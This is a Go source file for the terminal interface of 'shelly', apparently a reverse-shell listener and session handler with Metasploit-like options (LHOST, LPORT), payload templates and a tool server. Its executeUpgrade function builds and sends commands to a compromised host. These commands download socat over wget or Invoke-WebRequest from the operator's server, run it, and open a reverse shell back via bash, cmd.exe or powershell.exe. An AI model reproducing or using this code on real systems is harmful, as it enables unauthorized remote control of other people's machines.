package ui

import (
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"

	"github.com/charmbracelet/bubbles/textinput"
	"github.com/charmbracelet/bubbles/viewport"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/intox/shelly/pkg/config"
	"github.com/intox/shelly/pkg/session"
	"github.com/intox/shelly/pkg/toolbox"
)

type Mode int

const (
	ModeShelly Mode = iota
	ModeSession
	ModePrompt
)

var (
	titleStyle = lipgloss.NewStyle().
			Bold(true).
			Foreground(lipgloss.Color("#FAFAFA")).
			Background(lipgloss.Color("#7D56F4")).
			Padding(0, 1)

	headerStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#7D56F4"))

	promptStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#04B575")).
			Bold(true)

	sessionPromptStyle = lipgloss.NewStyle().
				Foreground(lipgloss.Color("#FF5F87")).
				Bold(true)

	statusStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#626262")).
			Italic(true)

	highlightStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#F1FA8C"))

	errorStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#FF5555")).
			Bold(true)
)

type sessionMsg string
type StartListenerMsg struct {
	Host string
	Port int
}
type StatusMsg string
type NewSessionMsg struct {
	ID       int
	TargetIP string
}

type Model struct {
	Config          *config.Config
	Sessions        *session.SessionManager
	Toolbox         *toolbox.Toolbox
	Textinput       textinput.Model
	Viewport        viewport.Model
	Terminal        string
	Mode            Mode
	ActiveSessionID int
	InSessionEscape bool
	CapturedPrompt  string
	LastChar        rune
	Ready           bool
	Width           int
	Height          int

	PromptLabel  string
	PromptAction func(string) (Model, tea.Cmd)

	// Metasploit-like options
	Options         map[string]string
	ListenerRunning bool

	// Callback to start listener from main
	OnStartListener func(string, int)
}

func NewModel(cfg *config.Config, sm *session.SessionManager, tb *toolbox.Toolbox, lhost string, lport int, httpport int, shell string) Model {
	ti := textinput.New()
	ti.Placeholder = "Type a command..."
	ti.Focus()
	ti.Prompt = promptStyle.Render("shelly> ")

	options := map[string]string{
		"LHOST":    lhost,
		"LPORT":    strconv.Itoa(lport),
		"HTTPPORT": strconv.Itoa(httpport),
		"SHELL":    shell,
	}

	return Model{
		Config:    cfg,
		Sessions:  sm,
		Toolbox:   tb,
		Textinput: ti,
		Mode:      ModeShelly,
		Options:   options,
	}
}

func (m Model) Init() tea.Cmd {
	return textinput.Blink
}

func (m Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var (
		tiCmd tea.Cmd
		vpCmd tea.Cmd
		cmds  []tea.Cmd
	)

	switch msg := msg.(type) {
	case sessionMsg:
		// Log first 100 chars of received data
		data := string(msg)
		if len(data) > 100 {
			log.Printf("[UI] Session data (%d bytes): %s...", len(data), data[:100])
		} else {
			log.Printf("[UI] Session data (%d bytes): %s", len(data), data)
		}
		m.Terminal += data

	case StatusMsg:
		m.Terminal += "\n" + string(msg)
		if strings.Contains(string(msg), "[!] Error") {
			m.ListenerRunning = false
		}
		if strings.Contains(string(msg), "Resuming upgrade") {
			if s, ok := m.Sessions.GetSession(m.ActiveSessionID); ok {
				var upCmd tea.Cmd
				m, upCmd = m.executeUpgrade(m.ActiveSessionID, s.OS)
				if upCmd != nil {
					cmds = append(cmds, upCmd)
				}
			}
		}

	case NewSessionMsg:
		log.Printf("[UI] New session %d from %s", msg.ID, msg.TargetIP)
		m.Terminal = fmt.Sprintf("[*] New session %d connected from %s\n", msg.ID, msg.TargetIP)
		m.ActiveSessionID = msg.ID
		m.Mode = ModeSession
		m.InSessionEscape = false
		m.Textinput.Prompt = sessionPromptStyle.Render(fmt.Sprintf("session[%d]> ", msg.ID))

	case StartListenerMsg:
		log.Printf("[UI] StartListenerMsg received: host=%s port=%d", msg.Host, msg.Port)
		if m.OnStartListener != nil {
			go m.OnStartListener(msg.Host, msg.Port)
		} else {
			log.Printf("[UI] OnStartListener is nil")
		}

	case tea.KeyMsg:
		if m.Mode == ModePrompt {
			switch msg.Type {
			case tea.KeyEnter:
				input := m.Textinput.Value()
				if m.PromptAction != nil {
					var pCmd tea.Cmd
					m, pCmd = m.PromptAction(input)
					m.PromptAction = nil
					m.Mode = ModeSession
					m.Textinput.SetValue("")
					m.Textinput.Placeholder = "Type a command..."
					m.Textinput.Prompt = sessionPromptStyle.Render(fmt.Sprintf("session[%d]> ", m.ActiveSessionID))
					if pCmd != nil {
						cmds = append(cmds, pCmd)
					}
				}
			case tea.KeyEsc:
				m.Mode = ModeSession
				m.Textinput.SetValue("")
				m.Textinput.Placeholder = "Type a command..."
				m.Textinput.Prompt = sessionPromptStyle.Render(fmt.Sprintf("session[%d]> ", m.ActiveSessionID))
			}
			m.Textinput, tiCmd = m.Textinput.Update(msg)
			m.Viewport, vpCmd = m.Viewport.Update(msg)
			cmds = append(cmds, tiCmd, vpCmd)
			return m, tea.Batch(cmds...)
		}

		if m.Mode == ModeSession && !m.InSessionEscape {
			// Passthrough mode
			// Capture key data
			var data string
			switch msg.Type {
			case tea.KeyRunes:
				data = string(msg.Runes)
			case tea.KeyEnter:
				data = "\n"
			case tea.KeySpace:
				data = " "
			case tea.KeyBackspace:
				data = "\b"
			case tea.KeyTab:
				data = "\t"
			case tea.KeyUp:
				data = "\x1b[A"
			case tea.KeyDown:
				data = "\x1b[B"
			case tea.KeyRight:
				data = "\x1b[C"
			case tea.KeyLeft:
				data = "\x1b[D"
			case tea.KeyHome:
				data = "\x1b[H"
			case tea.KeyEnd:
				data = "\x1b[F"
			case tea.KeyDelete:
				data = "\x1b[3~"
			case tea.KeyCtrlC:
				data = "\x03"
			case tea.KeyCtrlZ:
				data = "\x1a"
			case tea.KeyCtrlD:
				data = "\x04"
			}

			if data != "" {
				if s, ok := m.Sessions.GetSession(m.ActiveSessionID); ok && s.RW != nil {
					// Detect !s
					if m.LastChar == '!' && data == "s" {
						// Escape triggered!
						// Capture the current prompt line (strip trailing "!")
						lines := strings.Split(m.Terminal, "\n")
						if len(lines) > 0 {
							m.CapturedPrompt = strings.TrimSuffix(lines[len(lines)-1], "!")
						}
						// Clean "!" from terminal display
						m.Terminal = strings.TrimSuffix(m.Terminal, "!")

						fmt.Fprint(s.RW, "s\b\b") // Clear !s from remote
						m.InSessionEscape = true
						m.Textinput.SetValue("")
						m.Textinput.Prompt = promptStyle.Render(fmt.Sprintf("shelly [session %d]> ", m.ActiveSessionID))
						m.LastChar = 0
						return m, nil
					}
					// Send key to session
					fmt.Fprint(s.RW, data)
					if len(data) == 1 {
						m.LastChar = rune(data[0])
					} else {
						m.LastChar = 0
					}
				}
			}
			return m, nil
		}

		switch msg.Type {
		case tea.KeyCtrlC:
			if m.Mode == ModeShelly {
				return m, tea.Quit
			}
			m.switchToShelly()

		case tea.KeyCtrlZ:
			if m.Mode == ModeSession {
				m.switchToShelly()
			}

		case tea.KeyEnter:
			input := m.Textinput.Value()
			if m.Mode == ModeShelly {
				if input != "" {
					m.Terminal += fmt.Sprintf("\n%s %s", promptStyle.Render("shelly>"), input)
					var cmd tea.Cmd
					m, cmd = m.handleShellyCommand(input)
					m.Textinput.SetValue("")
					if cmd != nil {
						cmds = append(cmds, cmd)
					}
				}
			} else if m.Mode == ModeSession && m.InSessionEscape {
				// Escape command
				if input != "" {
					m.Terminal += fmt.Sprintf("\n%s %s", promptStyle.Render("shelly [session-escape]>"), input)
					var cmd tea.Cmd
					m, cmd = m.handleShellyCommand(input)
					m.Textinput.SetValue("")
					if cmd != nil {
						cmds = append(cmds, cmd)
					}
				}
				if m.Mode == ModeSession {
					// Visual aid: repeat host's prompt line
					if m.CapturedPrompt != "" {
						m.Terminal += "\n" + m.CapturedPrompt
					}
					m.InSessionEscape = false
					m.Textinput.Prompt = sessionPromptStyle.Render(fmt.Sprintf("session[%d]> ", m.ActiveSessionID))
					m.Textinput.SetValue("")
				}
			}
		}

	case tea.WindowSizeMsg:
		m.Width = msg.Width
		m.Height = msg.Height

		headerHeight := 1
		footerHeight := 1
		verticalMarginHeight := headerHeight + footerHeight

		if !m.Ready {
			m.Viewport = viewport.New(msg.Width, msg.Height-verticalMarginHeight)
			m.Viewport.SetContent(m.Terminal)
			m.Ready = true
		} else {
			m.Viewport.Width = msg.Width
			m.Viewport.Height = msg.Height - verticalMarginHeight
		}
	}

	if m.Mode == ModeShelly || (m.Mode == ModeSession && m.InSessionEscape) || m.Mode == ModePrompt {
		m.Textinput, tiCmd = m.Textinput.Update(msg)
	}
	m.Viewport, vpCmd = m.Viewport.Update(msg)
	m.Viewport.SetContent(m.Terminal)
	m.Viewport.GotoBottom()
	cmds = append(cmds, tiCmd, vpCmd)

	return m, tea.Batch(cmds...)
}

func (m *Model) switchToShelly() {
	m.Mode = ModeShelly
	m.InSessionEscape = false
	m.Textinput.Prompt = promptStyle.Render("shelly> ")
	m.Terminal += statusStyle.Render("\n[*] Returned to shelly prompt. Session still active in background.")
}

func (m Model) handleShellyCommand(input string) (Model, tea.Cmd) {
	parts := strings.Fields(input)
	if len(parts) == 0 {
		return m, nil
	}

	switch strings.ToLower(parts[0]) {
	case "help":
		m.Terminal += "\n" + highlightStyle.Render("Core Commands:")
		m.Terminal += "\n  help              - Show this help"
		m.Terminal += "\n  sessions          - List active sessions"
		m.Terminal += "\n  use <id>          - Interact with session"
		m.Terminal += "\n  upgrade           - Upgrade shell to socat (in session)"
		m.Terminal += "\n  run               - Start the listener"
		m.Terminal += "\n  exit/quit         - Exit shelly"
		m.Terminal += "\n\n" + highlightStyle.Render("Configuration:")
		m.Terminal += "\n  options           - Show current configuration"
		m.Terminal += "\n  set <var> <val>   - Set a variable (LHOST, LPORT, SHELL, etc.)"
		m.Terminal += "\n  download          - Download tools from toolbox"
		m.Terminal += "\n\n" + highlightStyle.Render("Payloads & Tools:")
		m.Terminal += "\n  payloads          - Show payloads for current SHELL"
		m.Terminal += "\n  toolbox           - List available tools in toolbox"

	case "options":
		m.Terminal += "\n" + highlightStyle.Render("Current Options:")
		keys := make([]string, 0, len(m.Options))
		for k := range m.Options {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		for _, k := range keys {
			m.Terminal += fmt.Sprintf("\n  %-10s : %s", k, m.Options[k])
		}

	case "set":
		if len(parts) < 3 {
			m.Terminal += "\nUsage: set <variable> <value>"
		} else {
			key := strings.ToUpper(parts[1])
			val := parts[2]
			m.Options[key] = val
			m.Terminal += fmt.Sprintf("\n%s => %s", key, val)
		}

	case "run":
		if m.ListenerRunning {
			m.Terminal += "\n[!] Listener is already running."
		} else {
			m.ListenerRunning = true
			m.Terminal += "\n[*] Starting listener..."
			log.Printf("[UI] Run command: LHOST=%s, LPORT=%s", m.Options["LHOST"], m.Options["LPORT"])
			port, err := strconv.Atoi(m.Options["LPORT"])
			if err != nil {
				log.Printf("[UI] Invalid LPORT: %v", err)
				m.Terminal += "\n[!] Invalid LPORT"
				break
			}
			return m, func() tea.Msg { return StartListenerMsg{Host: m.Options["LHOST"], Port: port} }
		}

	case "sessions":
		sessions := m.Sessions.ListSessions()
		if len(sessions) == 0 {
			m.Terminal += "\nNo active sessions."
		} else {
			m.Terminal += "\nID   Type     Target"
			for _, s := range sessions {
				m.Terminal += fmt.Sprintf("\n%-4d %-8s %s", s.ID, s.Type, s.TargetIP)
			}
		}

	case "toolbox":
		tools, err := m.Toolbox.List()
		if err != nil {
			m.Terminal += fmt.Sprintf("\nError listing toolbox: %v", err)
		} else if len(tools) == 0 {
			m.Terminal += "\nToolbox is empty. Use 'download' to fetch tools."
		} else {
			m.Terminal += "\n" + highlightStyle.Render("Available tools in toolbox:")
			for _, t := range tools {
				m.Terminal += fmt.Sprintf("\n  - %s (http://%s:%s/%s)", t, m.Options["LHOST"], m.Options["HTTPPORT"], t)
			}
		}

	case "download":
		m.Terminal += "\n[*] Starting download of all toolbox items..."
		return m, func() tea.Msg {
			errs := m.Toolbox.DownloadAll()
			if len(errs) > 0 {
				return StatusMsg(fmt.Sprintf("[!] Download errors: %d. Check logs.", len(errs)))
			}
			return StatusMsg("[*] All toolbox items downloaded successfully.")
		}

	case "payloads":
		m.PrintPayloads()
	case "debug":
		m.Terminal += "\n" + highlightStyle.Render("Debug Options:")
		for k, v := range m.Options {
			m.Terminal += fmt.Sprintf("\n  %s = %s", k, v)
		}
		m.Terminal += fmt.Sprintf("\n  ListenerRunning = %t", m.ListenerRunning)
		m.Terminal += fmt.Sprintf("\n  ActiveSessionID = %d", m.ActiveSessionID)
		m.Terminal += fmt.Sprintf("\n  Mode = %v", m.Mode)

	case "use", "interact":
		if len(parts) < 2 {
			m.Terminal += "\nUsage: use <session_id>"
		} else {
			id, err := strconv.Atoi(parts[1])
			if err != nil {
				m.Terminal += "\nInvalid session ID"
			} else if s, ok := m.Sessions.GetSession(id); ok {
				m.ActiveSessionID = id
				m.Mode = ModeSession
				m.InSessionEscape = false
				m.Textinput.Prompt = sessionPromptStyle.Render(fmt.Sprintf("session[%d]> ", id))
				m.Terminal += fmt.Sprintf("\n[*] Interacting with session %d (%s)", id, s.TargetIP)
			} else {
				m.Terminal += "\nSession not found"
			}
		}

	case "back", "bg", "background":
		m.switchToShelly()

	case "exit", "quit":
		return m, tea.Quit

	case "clear":
		m.Terminal = ""
		m.Viewport.SetContent(m.Terminal)
		m.Viewport.GotoBottom()

	case "upgrade":
		if m.Mode == ModeSession {
			return m.startUpgrade(m.ActiveSessionID)
		} else {
			m.Terminal += "\n[!] Not in a session"
		}

	default:
		m.Terminal += fmt.Sprintf("\nUnknown command: %s", parts[0])
	}
	return m, nil
}

func (m Model) View() string {
	if !m.Ready {
		return "\n  Initializing..."
	}

	modeStr := ""
	if m.Mode == ModeSession {
		modeStr = fmt.Sprintf("SESSION %d", m.ActiveSessionID)
	}

	status := "Stopped"
	if m.ListenerRunning {
		status = "Listening"
	}

	header := headerStyle.Render(fmt.Sprintf("%s v0.1.0 | %s | %s | %s:%s",
		titleStyle.Render(" SHELLY "), modeStr, status, m.Options["LHOST"], m.Options["LPORT"]))

	helpStr := "Ctrl+C: Quit • 'help' for commands"
	if m.Mode == ModeSession {
		target := "unknown"
		if s, ok := m.Sessions.GetSession(m.ActiveSessionID); ok {
			target = s.TargetIP
		}
		helpStr = fmt.Sprintf("Session %d (%s) • Ctrl+Z: Shelly • !s: Shelly command • Ctrl+C: Escape", m.ActiveSessionID, target)
	}

	footer := fmt.Sprintf("%s | %s",
		m.Textinput.View(),
		statusStyle.Render(helpStr))

	if m.Mode == ModePrompt {
		footer = fmt.Sprintf("%s %s",
			promptStyle.Render(m.PromptLabel),
			m.Textinput.View())
	}

	return fmt.Sprintf("%s\n%s\n%s", header, m.Viewport.View(), footer)
}

func (m *Model) PrintPayloads() {
	shellName := m.Options["SHELL"]
	if s, ok := m.Config.Shells[shellName]; ok {
		m.Terminal += "\n" + highlightStyle.Render(fmt.Sprintf("Payloads for %s (%s:%s):", shellName, m.Options["LHOST"], m.Options["LPORT"]))
		for _, t := range s.Templates {
			p := strings.ReplaceAll(t, "{ip}", m.Options["LHOST"])
			p = strings.ReplaceAll(p, "{port}", m.Options["LPORT"])
			p = strings.ReplaceAll(p, "{http_port}", m.Options["HTTPPORT"])
			m.Terminal += fmt.Sprintf("\n%s", p)
		}
	} else {
		m.Terminal += fmt.Sprintf("\nShell '%s' not found in config", shellName)
	}
}

func (m Model) detectOS() string {
	lines := strings.Split(m.Terminal, "\n")
	if len(lines) == 0 {
		return "unknown"
	}
	lastLine := lines[len(lines)-1]

	// Windows PowerShell: PS C:\Users\mtfd>
	if strings.HasPrefix(lastLine, "PS ") {
		return "windows-powershell"
	}
	// Windows CMD: C:\Users\mtfd>
	if strings.Contains(lastLine, ">") && (strings.Contains(lastLine, ":\\") || strings.Contains(lastLine, "C:")) {
		return "windows-cmd"
	}
	// Linux: mtfd@goose:~$ or root@goose:~#
	if (strings.Contains(lastLine, "@") && strings.Contains(lastLine, ":")) || strings.HasSuffix(lastLine, "$ ") || strings.HasSuffix(lastLine, "# ") {
		return "linux"
	}

	return "unknown"
}

func (m Model) startUpgrade(id int) (Model, tea.Cmd) {
	s, ok := m.Sessions.GetSession(id)
	if !ok {
		m.Terminal += "\n[!] Session not found"
		return m, nil
	}

	osName := s.OS
	if osName == "" || osName == "unknown" {
		osName = m.detectOS()
	}

	if osName == "unknown" {
		m.Mode = ModePrompt
		m.PromptLabel = "Detect OS (linux/windows-cmd/windows-powershell): "
		m.Textinput.Placeholder = "linux"
		m.Textinput.SetValue("")
		m.Textinput.Prompt = promptStyle.Render("os> ")
		m.PromptAction = func(input string) (Model, tea.Cmd) {
			if input == "" {
				input = "linux"
			}
			return m.executeUpgrade(id, input)
		}
		return m, nil
	}

	return m.executeUpgrade(id, osName)
}

func (m Model) executeUpgrade(id int, osName string) (Model, tea.Cmd) {
	s, ok := m.Sessions.GetSession(id)
	if !ok {
		m.Terminal += "\n[!] Session not found"
		return m, nil
	}

	// Update session OS
	s.OS = osName

	lport, _ := strconv.Atoi(m.Options["LPORT"])
	socatPort := lport + 1

	// Ensure socat binary is available in toolbox
	var binName string
	var archKey string
	switch osName {
	case "linux":
		binName = "socatx64.bin"
		archKey = "lin_64"
	case "windows-cmd", "windows-powershell":
		binName = "socatx64.exe"
		archKey = "win_64"
	}

	if binName != "" {
		destPath := filepath.Join(m.Toolbox.Dir, binName)
		if _, err := os.Stat(destPath); os.IsNotExist(err) {
			// Check if we can download it
			var downloadURL string
			if item, ok := m.Config.Toolbox["socat"]; ok {
				if details, ok := item[archKey]; ok {
					downloadURL = details.Download
				}
			}

			if downloadURL != "" {
				m.Mode = ModePrompt
				m.PromptLabel = fmt.Sprintf("%s not found. Download it? (y/n): ", binName)
				m.Textinput.Placeholder = "y"
				m.Textinput.SetValue("")
				m.Textinput.Prompt = promptStyle.Render("download> ")
				m.PromptAction = func(input string) (Model, tea.Cmd) {
					if strings.ToLower(input) == "n" {
						m.Terminal += "\n[!] Upgrade aborted: missing " + binName
						return m, nil
					}
					m.Terminal += "\n[*] Downloading " + binName + "..."
					return m, func() tea.Msg {
						err := m.Toolbox.DownloadFile(downloadURL, binName)
						if err != nil {
							return StatusMsg(fmt.Sprintf("[!] Download failed: %v", err))
						}
						return StatusMsg(fmt.Sprintf("[*] Downloaded %s. Resuming upgrade...", binName))
					}
				}
				return m, nil
			} else {
				m.Terminal += fmt.Sprintf("\n[!] Warning: %s not found in toolbox and no download URL found in config.", binName)
			}
		}
	}

	m.Terminal += fmt.Sprintf("\n[*] Upgrading session %d to socat (OS: %s)...", id, osName)

	ip := m.Options["LHOST"]
	httpPort := m.Options["HTTPPORT"]

	var payload string
	switch osName {
	case "linux":
		payload = fmt.Sprintf("wget -q http://%s:%s/socatx64.bin -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%d\n", ip, httpPort, ip, socatPort)
	case "windows-cmd":
		payload = fmt.Sprintf("powershell -c \"Invoke-WebRequest -Uri http://%s:%s/socatx64.exe -OutFile %%TEMP%%\\socat.exe\"; %%TEMP%%\\socat.exe tcp:%s:%d exec:cmd.exe,pty,stderr,setsid,sigint,sane\n", ip, httpPort, ip, socatPort)
	case "windows-powershell":
		payload = fmt.Sprintf("Invoke-WebRequest -Uri http://%s:%s/socatx64.exe -OutFile $env:TEMP\\socat.exe; & $env:TEMP\\socat.exe tcp:%s:%d exec:powershell.exe,pty,stderr,setsid,sigint,sane\n", ip, httpPort, ip, socatPort)
	}

	if payload != "" {
		fmt.Fprint(s.RW, payload)
		m.Terminal += "\n[*] Upgrade command sent. Waiting for connection on port " + strconv.Itoa(socatPort) + "..."
	} else {
		m.Terminal += "\n[!] No payload for OS: " + osName
		return m, nil
	}

	return m, func() tea.Msg { return StartListenerMsg{Host: m.Options["LHOST"], Port: socatPort} }
}

func WaitForSessionData(id int, rw io.Reader, p *tea.Program) {
	buf := make([]byte, 1024)
	for {
		n, err := rw.Read(buf)
		if n > 0 {
			log.Printf("[DEBUG] Session %d read %d bytes", id, n)
			p.Send(sessionMsg(string(buf[:n])))
		}
		if err != nil {
			log.Printf("[DEBUG] Session %d read error: %v", id, err)
			p.Send(sessionMsg(fmt.Sprintf("\n[!] Session %d connection closed: %v", id, err)))
			return
		}
	}
}
